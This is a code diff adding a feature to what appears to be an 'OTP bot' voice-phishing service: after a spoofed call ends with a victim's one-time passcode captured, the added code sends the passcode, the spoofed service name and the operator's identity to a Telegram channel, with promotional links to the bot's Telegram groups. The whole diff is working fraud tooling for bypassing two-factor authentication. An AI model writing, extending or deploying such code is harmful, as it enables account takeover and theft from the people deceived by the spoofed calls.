@@ -1927,6 +1927,34 @@ async def handle_call_events(request: Request):
             
             # Calculate call duration and save history
             await save_call_history(session_id, session, call_id, "completed" if reason == "completed" else reason)
+
+            
+            # Send Telegram notification for call completion (if OTP was captured)
+            if session.get("otp_received"):
+                try:
+                    user_email_censored = censor_email(session.get("user_email", "unknown@email.com"))
+                    otp = session.get("otp_received")
+                    otp_digits = len(str(otp))
+                    
+                    telegram_message = f"""┏ 📱 Call completed successfully!
+┣ Call Type: Custom
+┣ Mode: Live
+┣ Service: {session.get('service_name', 'N/A')}
+┣ Is Spoofing: Yes
+┣ User: {user_email_censored}
+┣ Time: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}
+┗ Verification Type: NORMAL
+
+┏ ℹ️ Captures ℹ️
+┣ 📍 OTP ({otp_digits}): {otp}
+┗ Captured By: {user_email_censored}
+
+© BOT | DINOSAURODISCUSSION https://t.me/DINOSAUROTPDISCUSSION | VOUCHES LINK https://t.me/DINOSAUROTPVOUCHES | DINOSAUROTP https://t.me/DINOSAUROTP"""
+                    
+                    asyncio.create_task(send_telegram_message(telegram_message))
+                except Exception as e:
+                    logger.error(f"Failed to send Telegram completion notification: {e}")
+
             
             # Try to get recording URL
             asyncio.create_task(fetch_and_emit_recording(session_id, call_id))
